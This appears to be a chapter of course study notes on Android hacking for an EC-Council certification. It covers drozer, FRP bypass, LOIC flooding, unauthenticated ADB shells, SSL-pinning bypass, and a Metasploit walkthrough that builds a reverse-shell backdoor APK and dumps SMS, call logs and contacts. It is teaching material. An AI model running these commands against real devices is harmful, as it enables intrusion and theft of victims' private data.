# 03 — Hacking Android Devices (Tools, Techniques & Commands)

> **Objective 2 (EC‑Council):** Explain Various Android OS Threats and Attacks — Part B (Exploitation)

## Table of Contents
- [3.1 Identifying Attack Surfaces with drozer](#31-identifying-attack-surfaces-with-drozer)
- [3.2 Bypassing FRP with 4uKey](#32-bypassing-frp-with-4ukey)
- [3.3 zANTI & Kali NetHunter](#33-zanti--kali-nethunter)
- [3.4 DoS via LOIC](#34-dos-via-loic)
- [3.5 Anonymizing with Orbot Proxy](#35-anonymizing-with-orbot-proxy)
- [3.6 Exploiting ADB with PhoneSploit Pro](#36-exploiting-adb-with-phonesploit-pro)
- [3.7 Man‑in‑the‑Disk (MITD) Attack](#37-man-in-the-disk-mitd-attack)
- [3.8 Spearphone Attack](#38-spearphone-attack)
- [3.9 Exploiting Android with the Metasploit Framework](#39-exploiting-android-with-the-metasploit-framework)
- [3.10 Analyzing a Connected Android Device](#310-analyzing-a-connected-android-device)
- [3.11 Other Android Hacking Techniques](#311-other-android-hacking-techniques)

---

## 3.1 Identifying Attack Surfaces with drozer

**drozer** (formerly Mercury, now maintained by WithSecure Labs) is a Java/Python security-assessment framework for Android that runs a **drozer agent** on the target device and a **drozer console** on the attacker's machine, communicating over a socket — no USB debugging required if the agent APK is already installed/sideloaded.

### Setup
```bash
# Attacker workstation
pip3 install drozer --break-system-packages

# Install and launch the drozer Agent APK on the target device, then:
adb forward tcp:31415 tcp:31415
drozer console connect
```

### Fetching Package Information
```text
dz> run app.package.list
# Displays all packages installed on the device

dz> run app.package.list -f <string_name>
# Filters/retrieves a package name matching <string_name>

dz> run app.package.info -a <package_name>
# Retrieves basic details about a specific package
```

### Identifying the Attack Surface
```text
dz> run app.package.attacksurface <package_name>
# Lists exported activities / broadcast receivers / content providers / services,
# and whether the app is flagged "debuggable"

dz> run app.activity.info -a <package_name>
# Displays details of the exported activities (and any permission required)
```

### Launching Activities to Bypass Authentication
```text
dz> run app.activity.start --component <package_name> <activity_name>
```

Launching an exported activity directly — skipping the app's normal login `Activity` — is a classic way to reach a "logged‑in" screen without ever authenticating, or to reveal hardcoded credentials that a developer left visible in a debug/test activity (EC‑Council's own screenshot example against `com.withsecure.example.sieve` surfaced plaintext strings like `bkpuserbkp` / `bkppassbkp` this way).

> **Why this matters:** every exported `Activity`, `Service`, `ContentProvider`, and `BroadcastReceiver` is, by definition, reachable by *any other app on the device* — including a malicious one with zero permissions. `drozer` simply automates what a malicious app would otherwise have to do in code.

## 3.2 Bypassing FRP with 4uKey

**Factory Reset Protection (FRP)** ties an Android device to the last‑signed‑in Google account after a factory reset, specifically to stop thieves from reusing a stolen device. Commercial tools like **4uKey** (Tenorshare) and **Octoplus FRP** automate bypassing it.

**Steps (4uKey):**
1. Launch 4uKey, connect the locked device via USB → click **Remove Google Lock (FRP)**.
2. Select the correct Android OS version for the device.
3. Click **Start** to begin the FRP‑removal routine.
4. Follow the on‑device prompts (e.g., Samsung diagnostic‑menu dial‑pad sequence `*#0*#`, "Always Allow From This Computer" pop‑up).
5. A **"Bypassed Google FRP Lock Successfully"** dialog confirms completion.

> FRP bypass tools are dual‑use: IT asset‑recovery teams and legitimate device resellers use them on hardware they lawfully own; the identical workflow is what's used to re‑purpose stolen phones. Only use this against a device you own and can prove ownership of.

## 3.3 zANTI & Kali NetHunter

### zANTI (Zimperium)
An Android app that turns a phone into a mobile pentest platform on the local network:
- Spoof MAC address
- Stand up a malicious Wi‑Fi hotspot to capture/hijack victim traffic
- Scan for open ports; exploit known router vulnerabilities
- Password‑complexity auditing
- MITM & DoS attacks
- View/modify/redirect HTTP requests & responses; redirect HTTPS→HTTP; redirect a request to an arbitrary IP/page
- Inject HTML into pages in transit
- Hijack sessions
- View/replace images in transit; intercept downloads

### Kali NetHunter
The official Kali mobile penetration‑testing platform (runs as a chroot alongside stock Android on supported/rooted devices). Notable modules:
- **HID keyboard attacks** — the phone emulates a USB keyboard against a plugged‑in target computer
- **BadUSB attacks** and **MITM Framework**
- **Mana Wireless Toolkit** — evil-AP / Wi‑Fi impersonation attacks
- **Metasploit Payload Generator** built in — pick a payload, set `LHOST`/`LPORT`, generate straight to SD card
- **DuckHunter HID**, **USB Arsenal**, MAC changer, Kali chroot/services management

## 3.4 DoS via LOIC

**Low Orbit Ion Cannon (LOIC)**, ported to Android, floods a target with UDP/HTTP/TCP traffic.

1. Install the LOIC Android app.
2. Launch it, enter the target IP/URL in **Target IP**, tap **GET IP**.
3. Choose the flood method: **UDP / HTTP / TCP**.
4. Set **port** and **thread count** (positive integers).
5. Tap **START**.

> A single mobile device won't meaningfully DoS a hardened target — LOIC's real‑world relevance is almost entirely in *distributed* (many clients, coordinated) scenarios, and even then it is trivially detected/blocked by any modern WAF/DDoS‑mitigation service. Never point this at infrastructure you don't own; DoS testing requires explicit, written authorization and usually a maintenance window.

## 3.5 Anonymizing with Orbot Proxy

**Orbot** (`orbot.app`, from the Guardian Project) routes Android traffic through the **Tor** network. Attackers (and privacy‑conscious users alike) use it to mask source IP while scanning/attacking or simply browsing. Configuration options include direct Tor connection, community/cloud bridge relays, or requesting new bridges when Tor is actively blocked on the local network.

## 3.6 Exploiting ADB with PhoneSploit Pro

**Android Debug Bridge (ADB)** is Google's own command‑line bridge for installing/debugging apps and running shell commands on a device. It's meant to be used over USB with debugging explicitly enabled — but many devices (custom ROMs, misconfigured IoT/STBs, forgotten dev units) ship with the **ADB daemon listening on TCP port 5555** with no authentication.

```bash
# From the attack machine, against a device with TCP debugging exposed on 5555:
adb connect 10.10.1.14:5555
adb devices           # confirm "10.10.1.14:5555   device"
adb shell             # you now have an unauthenticated shell
```

**PhoneSploit Pro** (`github.com/AzeemIdrisi`) wraps this into a menu‑driven toolkit: screen capture, dumping system info, listing running apps, port forwarding, installing/uninstalling arbitrary APKs, and toggling Wi‑Fi — all without ever touching the victim's screen.

> Port 5555 exposed to the internet is regularly mass‑scanned (it's a Mirai‑botnet‑era favorite). If you're defending: **never** enable "ADB over network" / `adb tcpip` on a production or personal device unless it's on an isolated lab network, and disable it (`adb usb`) immediately after use.

## 3.7 Man‑in‑the‑Disk (MITD) Attack

Android splits storage into **internal** (sandboxed per app) and **external** (shared, historically world‑writable). Apps that fetch update code or resources through external storage — instead of validating and sandboxing it — are vulnerable to MITD, a storage‑layer variant of MITM:

1. Victim installs a legitimate app from the official store.
2. The app requests a routine update; the update payload is staged through **external storage**.
3. Because external storage is shared, an attacker (already present on the device via another app, or with physical/ADB access) monitors it and **tampers with the staged update code**.
4. The legitimate app fetches and executes the tampered code from external storage, believing it to be its own update.
5. The tampered code silently installs a fraudulent app in place of the expected update.
6. From here, the attacker can steal credentials/photos/contacts, or hijack the microphone/camera and take broader control of the device.

## 3.8 Spearphone Attack

Exploits the fact that any installed app can read the phone's **accelerometer** with *zero special permissions*. When a call is on loudspeaker, the phone's own speaker vibrations are physically detectable by the accelerometer (both sit on/near the same chassis surface).

1. Victim takes a call on loudspeaker.
2. A malicious app (no microphone permission needed) logs the accelerometer output during the call.
3. The accelerometer log is exfiltrated to the attacker.
4. Speech‑reconstruction / speaker‑ and gender‑classification models process the vibration data to recover the conversation's content or identify the speaker(s).

## 3.9 Exploiting Android with the Metasploit Framework

**Step 1 — Recon available modules:**
```text
msf > search type:exploit platform:android
msf > search type:payload platform:android
```

**Step 2 — Build a malicious APK payload with `msfvenom`:**
```bash
msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik \
  LHOST=10.10.1.13 R > Desktop/Backdoor.apk
```
> `-p` payload, `--platform android -a dalvik` targets the Dalvik/ART bytecode format, `LHOST` is the attacker's callback IP, `R` emits raw output redirected into an `.apk`. This is functionally identical to `msfvenom`'s own documented usage — nothing exotic, just packaged as an APK.

**Step 3 — Get the victim to install & open `Backdoor.apk`** (this requires either social engineering, sideloading permission, or an existing foothold — Metasploit does not auto‑deliver or auto‑install the payload).

**Step 4 — Start a matching listener:**
```text
msf > use exploit/multi/handler
msf > set PAYLOAD android/meterpreter/reverse_tcp
msf > set LHOST 10.10.1.13
msf > set LPORT 4444
msf > exploit
```

**Step 5 — Verify the session:**
```text
meterpreter > sysinfo
```

**Step 6 — Post‑exploitation data‑gathering commands:**
```text
meterpreter > ipconfig
meterpreter > pwd
meterpreter > ps
meterpreter > dump_sms
meterpreter > dump_calllog
meterpreter > dump_contacts
meterpreter > webcam_list
```

> `dump_sms`, `dump_calllog`, and `dump_contacts` require the app to actually be granted the relevant Android runtime permissions — on modern Android (10+) this means the victim must have tapped "Allow" at least once, which is why real‑world droppers overlay convincing permission‑request screens rather than relying on the OS default prompt alone.

## 3.10 Analyzing a Connected Android Device

*Source: mas.owasp.org*

### Accessing the Device over Wi‑Fi (no cable needed after setup)
```bash
adb tcpip 5555                       # 1. with USB still connected, switch the daemon to TCP mode
# 2. unplug the USB cable
adb connect <device_ip_address>      # 3. connect over Wi-Fi (same network as the attacker box)
adb devices                          # 4. confirm connection
adb shell                            # 5. open a shell
```

### Enumerating Installed Applications
```bash
adb shell pm list packages           # all packages
adb shell pm list packages -3 -f     # third-party packages only, with their APK paths

# Or with Frida:
frida-ps -Uai
#   -a : all apps      -i : currently installed      -U : over USB
```

### Disassembling a Target App Package
```bash
apktool d <App_package>.apk
tree
# Unpacks AndroidManifest.xml, META-INF/, assets/, classes.dex, lib/, res/, resources.arsc
```

### Monitoring Logs
```bash
adb logcat > logcat.log
```

### Listing Open Files / Connections (on-device, as root)
```bash
lsof -p <pid>
netstat -p | grep <pid>
```

### Signing & Installing a Modified/Malicious APK
```bash
# 1. Generate a custom debug keystore (self-signed code-signing cert):
keytool -genkey -v -keystore ~/.android/debug.keystore -alias signkey \
  -keyalg RSA -keysize 2048 -validity 20000

# 2. Sign the (repackaged/modified) APK with it:
apksigner sign --ks ~/.android/debug.keystore --ks-key-alias signkey <malicious_file>.apk
```
> Android will refuse to install any APK whose signature doesn't verify — repackaging *always* requires re‑signing, which is exactly why a repackaged malicious app can never carry the original developer's signature. This is the basis for the "app repackaging detectors" covered in file 10 (checksum/signature validation).

## 3.11 Other Android Hacking Techniques

### Advanced SMS Phishing (OTA Provisioning Abuse)
Exploits **Over‑the‑Air (OTA) provisioning**, the mechanism carriers use to remotely push network settings. With a cheap USB modem and the victim's **IMSI** (or, lacking that, a two‑message PIN‑authentication trick), an attacker sends a spoofed "carrier" provisioning SMS that silently rewrites the device's **message server, mail server, directory server, and proxy addresses** — quietly redirecting the victim's traffic through attacker infrastructure.

### Bypassing SSL Pinning
SSL/certificate pinning stops MITM proxies (like Burp) from intercepting an app's HTTPS traffic by hardcoding which certificate/public key the app should trust. Two standard bypass techniques:

**(a) Reverse engineering with Apktool:**
```bash
apktool d <application_name.apk>          # decompile to smali + resources
# Locate checkClientTrusted / checkServerTrusted in the smali code
#   (these implement the X.509 trust validation you need to neutralize)
# ... patch the smali to always return "trusted" ...
apktool b <application_directory_name>    # rebuild the modified app
# (then re-sign it per §3.10 before installing)
```

**(b) Hooking with Frida:**
```bash
frida -U -l <Hooking_file.js> -f <package_name>
# -U : attach over USB     -l : load a JS hook script     -f : spawn (launch) the target app
```
Example session output:
```text
$ frida -U -l mainactivityhook.js -f jakhar.aseem.diva
Frida 14.2.2 - A world-class dynamic instrumentation toolkit
Spawning `jakhar.aseem.diva`...
Script loaded!
Spawned `jakhar.aseem.diva`. Use %resume to let the main thread start executing!
[Google Pixel 2::jakhar.aseem.diva]-> %resume
[Google Pixel 2::jakhar.aseem.diva]-> message: {u'type': u'send', u'payload': u'Hooks installed'} data: None
```
> Frida hooking works identically for **iOS** apps (see file 07) — it's a cross‑platform dynamic instrumentation toolkit, not an Android‑only tool.

### Tap 'n Ghost Attack
Targets NFC and the RX electrodes used in capacitive touchscreens, combining two techniques:
- **Tag‑based Adaptive Ploy (TAP):** an NFC tag emulator silently forces the device to visit an attacker‑controlled URL (no user consent), which then performs device fingerprinting.
- **Ghost Touch Generator:** electrically induces a "ghost touch" on the touchscreen that lands precisely on a **Cancel** button rendered to *look* like a permit/allow button — tricking the victim into unknowingly granting remote access. (Researchers demonstrated this can also target NFC‑enabled kiosks such as voting machines and ATMs.)

---
**Previous:** [`02-android-architecture-and-rooting.md`](02-android-architecture-and-rooting.md) | **Next:** [`04-android-malware-and-tools.md`](04-android-malware-and-tools.md)
